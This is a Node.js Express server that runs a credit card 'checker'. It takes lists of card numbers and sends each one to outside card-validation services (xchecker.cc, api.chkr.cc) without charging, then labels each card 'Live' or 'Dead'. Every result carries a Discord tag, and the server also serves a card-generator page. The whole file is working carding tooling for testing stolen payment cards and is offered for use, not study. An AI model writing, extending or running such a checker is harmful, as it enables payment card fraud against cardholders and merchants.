const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Basic Checker
app.post('/api/basic/check', async (req, res) => {
    console.log('Basic check request received');
    try {
        const { cards } = req.body;
        if (!cards || !Array.isArray(cards)) {
            return res.status(400).json({ success: false, error: 'Invalid request' });
        }

        const results = [];
        for (const card of cards) {
            try {
                const response = await fetch(`https://xchecker.cc/api.php?cc=${encodeURIComponent(card)}`);
                const data = await response.json();
                results.push({
                    card,
                    status: data.status,
                    message: `${data.status} | ${data.details || 'Card Declined'} | .gg/aeolous`
                });
            } catch (error) {
                results.push({
                    card,
                    status: 'Dead',
                    message: 'Card Declined | .gg/aeolous'
                });
            }
            await new Promise(r => setTimeout(r, 2000));
        }

        res.json({ success: true, results });

    } catch (error) {
        console.error('Basic check error:', error);
        res.status(500).json({
            success: false,
            error: 'Gateway Error'
        });
    }
});

// Pro Checker
app.post('/api/pro/check', async (req, res) => {
    console.log('Pro check request received');
    try {
        const { cards } = req.body;
        if (!cards || !Array.isArray(cards)) {
            return res.status(400).json({ success: false, error: 'Invalid request' });
        }

        const results = [];
        for (const card of cards) {
            try {
                const response = await fetch('https://api.chkr.cc/', {
                    method: 'POST',
                    headers: {
                        'Accept': '*/*',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({
                        data: card,
                        charge: 'false'
                    })
                });

                const data = await response.json();
                results.push({
                    card,
                    status: data.code === 1 ? 'Live' : 'Dead',
                    message: `${data.status} | ${data.message || 'Card Declined'} | .gg/aeolous`
                });
            } catch (error) {
                results.push({
                    card,
                    status: 'Dead',
                    message: 'Card Declined | .gg/aeolous'
                });
            }
            await new Promise(r => setTimeout(r, 3000));
        }

        res.json({ success: true, results });

    } catch (error) {
        console.error('Pro check error:', error);
        res.status(500).json({
            success: false,
            error: 'Gateway Error'
        });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'chk.html'));
});

app.get('/gen', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'gen.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
